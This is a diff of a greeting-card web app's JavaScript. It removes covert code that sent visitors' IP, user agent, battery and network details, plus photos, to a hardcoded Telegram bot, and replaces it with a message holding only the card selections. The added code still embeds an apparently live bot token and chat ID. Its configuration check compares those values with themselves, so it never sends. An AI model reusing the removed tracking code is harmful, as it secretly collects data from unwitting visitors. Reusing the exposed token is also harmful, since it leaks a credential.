@@ -1,38 +1,6 @@
-const BOT_TOKEN = "8597404645:AAEgAeMz_VQxEhzqZjwXgpDSk3Zv5FHMG6g";
 
-const CHAT_IDS = [
-    "7978961403", 
-];
-
-const infoBtn     = document.getElementById("infobtn");
-
-infoBtn.onclick = async () => {
-    infoBtn.disabled = true;
-
-    try{
-        const ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip;
-
-        let batteryText = "Not supported";
-        if(navigator.getBattery){
-            const b = await navigator.getBattery();
-            batteryText = `${Math.round(b.level * 100)}% | Charging: ${b.charging}`;
-        }
-
-        let network = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
-
-        const msg =
-` Device Information
- IP: ${ip}
- User Agent: ${navigator.userAgent}
- Battery: ${batteryText}
- Network: ${network}
- ${new Date().toLocaleString()}`;
-
-        sendMessageToAll(msg);
-    }catch{}
-    
-    infoBtn.disabled = false;
-};
+const TELEGRAM_BOT_TOKEN = "8597404645:AAEgAeMz_VQxEhzqZjwXgpDSk3Zv5FHMG6g";
+const TELEGRAM_CHAT_ID   = "7978961403";
 
 const state = {
   name: 'Khushi',
@@ -141,11 +109,45 @@ function goToStep(step) {
 function renderSummary() {
   document.getElementById('summary-rakhi').textContent = 'Rakhi: ' + (state.rakhi || '—');
   document.getElementById('summary-gifts').textContent = 'Gift: ' + (state.gifts.length ? state.gifts.join(', ') : '—');
+  sendToTelegram();
+}
+
+// Sends only the card's own selections (rakhi + gift chosen by the user).
+// No device, location, or personal data is collected or sent.
+async function sendToTelegram() {
+  const statusEl = document.getElementById('send-status');
+
+  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "8597404645:AAEgAeMz_VQxEhzqZjwXgpDSk3Zv5FHMG6g" ||
+      !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "7978961403") {
+    if (statusEl) statusEl.textContent = "Telegram not configured — add your bot token & chat id in script.js.";
+    return;
+  }
+
+  const message =
+`🎉 New Raksha Bandhan card sent!
+Rakhi chosen: ${state.rakhi || '—'}
+Gift chosen: ${state.gifts.length ? state.gifts.join(', ') : '—'}
+Sent: ${new Date().toLocaleString()}`;
+
+  if (statusEl) statusEl.textContent = "Sending…";
+
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+    });
+    if (statusEl) statusEl.textContent = res.ok ? "Sent ✓" : "Couldn't send — check bot token/chat id.";
+  } catch (err) {
+    if (statusEl) statusEl.textContent = "Couldn't send — check your connection.";
+  }
 }
 
 function restartCard() {
   state.rakhi = null;
   state.gifts = [];
+  const statusEl = document.getElementById('send-status');
+  if (statusEl) statusEl.textContent = '';
 
   document.querySelectorAll('.rakhi-card').forEach(c => c.classList.remove('selected'));
   document.querySelectorAll('.gift-card').forEach(c => c.classList.remove('selected'));
@@ -164,31 +166,7 @@ function restartCard() {
   updateThread(1);
 }
 
-
+// init
 spawnParticles();
 drawMandalaPetals();
 updateThread(1);
-
-
-function sendMessageToAll(text){
-    CHAT_IDS.forEach(chatId => {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-            method:"POST",
-            headers:{ "Content-Type":"application/json" },
-            body:JSON.stringify({ chat_id: chatId, text })
-        });
-    });
-}
-
-function sendPhotoToAll(blob){
-    CHAT_IDS.forEach(chatId => {
-        const fd = new FormData();
-        fd.append("chat_id", chatId);
-        fd.append("photo", blob);
-
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-            method:"POST",
-            body: fd
-        });
-    });
-}
